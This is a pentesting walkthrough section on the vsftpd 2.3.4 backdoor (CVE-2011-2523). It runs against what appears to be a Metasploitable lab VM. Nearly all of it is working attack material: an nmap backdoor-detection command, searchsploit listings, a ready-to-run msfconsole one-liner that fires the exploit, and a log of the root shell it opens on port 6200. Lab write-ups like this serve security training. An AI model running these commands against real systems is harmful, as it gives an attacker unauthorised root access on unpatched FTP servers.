### VSFTPD (PORT 21) - CHECK

This port can be used as a backdoor, it is not by design, but exploitable by using msfconsole (metasploit).

**Vuln**
There’s a backdoor on port 6200 opened by the vsftpd service, it’s added on vsftpd download archive on version 2.3,4 between June 30th 2011 & July 1st 2011.

**Nmap script**
````
$ nmap -script ftp-vsftpd-backdoor -p 21 192.168.56.101
````

*Port 21 // scan results*
````
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  BID:48539
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|_      https://www.securityfocus.com/bid/48539
````
**Searchsploit**
````
$ searchsploit vsftpd
````

````
--------------------------------------------------------------- ----------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ----------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1) | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2) | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                               | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)         | unix/remote/17491.rb
--------------------------------------------------------------- ----------------------------------
````

**Metasploitable // vsftpd 2.3.4 backdoor**
````
$ msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor;set RHOST 192.168.56.101;set payload cmd/unix/interact;exploit'
````

**vsftpd backdoor**

````
[*] No payload configured, defaulting to cmd/unix/interact
RHOST => 192.168.56.101
payload => cmd/unix/interact
[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.101:21 - USER: 331 Please specify the password.
[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.56.101:6200) at yyyy-mm-dd hh:mm:ss +TMZN

whoami
root
        
uname -a

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
````
